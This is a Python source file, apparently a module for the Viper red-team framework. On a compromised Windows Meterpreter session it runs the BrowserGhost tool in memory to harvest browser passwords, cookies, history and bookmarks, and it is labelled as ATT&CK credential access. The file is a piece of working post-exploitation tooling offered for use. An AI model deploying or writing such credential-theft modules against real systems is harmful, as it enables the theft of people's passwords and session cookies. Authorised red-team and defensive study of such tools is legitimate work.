# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "获取Windows浏览器密码(C#)"
    DESC_ZH = "模块使用BrowserGhost获取Windows系统浏览器密码/cookie/历史记录/书签.\n" \
              "模块内存执行BrowserGhost获取信息,并将结果输出"

    NAME_EN = "Get Windows browser password (C#)"
    DESC_EN = "The module uses BrowserGhost to obtain the Windows system browser password/cookie/history/bookmark.\n" \
              "Module executes BrowserGhost in memory to obtain information and output the result"

    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/",
                  "https://github.com/QAX-A-Team/BrowserGhost"]
    README = ["https://www.yuque.com/vipersec/module/ynbyqg"]
    AUTHOR = ["Viper"]

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        self.set_assembly("BrowserGhost")
        self.set_execute_wait(10)

        session = Session(self._sessionid)

        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
